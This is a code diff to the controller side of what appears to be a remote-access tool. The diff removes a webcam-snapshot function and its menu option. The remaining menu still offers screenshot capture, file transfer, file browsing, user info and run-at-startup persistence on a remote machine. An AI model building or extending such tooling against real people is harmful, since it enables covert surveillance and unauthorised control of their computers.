@@ -217,31 +217,6 @@ def screenshot():
     print("Done!!!" + "\n" + "Total bytes received: " + str(os.path.getsize(strFile)) + " bytes")
 
 
-def webpic():
-    conn.send(str.encode("webpic"))
-    strClientResponse = conn.recv(1024).decode("utf-8")  # get info
-
-    if strClientResponse == "error":
-        print("\n" + "Could not detect webcam!")
-        return
-    else:
-        print("\n" + strClientResponse)
-
-    intBuffer = ""
-    for intCounter in range(0, len(strClientResponse)):  # get buffer size from client response
-        if strClientResponse[intCounter].isdigit():
-            intBuffer += strClientResponse[intCounter]
-    intBuffer = int(intBuffer)
-
-    strFile = time.strftime("%Y%m%d%H%M%S" + ".png")
-
-    ScrnData = recvall(intBuffer)
-    objPic = open(strFile, "wb")
-    objPic.write(ScrnData); objPic.close()
-
-    print("Done!!!" + "\n" + "Total bytes received: " + str(os.path.getsize(strFile)) + " bytes")
-
-
 def browse_files():
     conn.send(str.encode("filebrowser"))
     print("\n" + "Drives :")
@@ -453,8 +428,7 @@ def show_help():
     print("--o Open a website")
     print("--r Receive file from the user")
     print("--s Send file to the user")
-    print("--p (1) Take screenshot")
-    print("--p (2) Take webcam snapshot")
+    print("--p Take screenshot")
     print("--a Run at startup")
     print("--v View files")
     print("--u User Info")
@@ -491,10 +465,8 @@ def send_commands():
                 startup()
             elif strChoice == "--u":
                 user_info()
-            elif strChoice[:5] == "--p 1":
+            elif strChoice == "--p":
                 screenshot()
-            elif strChoice[:5] == "--p 2":
-                webpic()
             elif strChoice == "--v":
                 browse_files()
             elif strChoice == "--s":
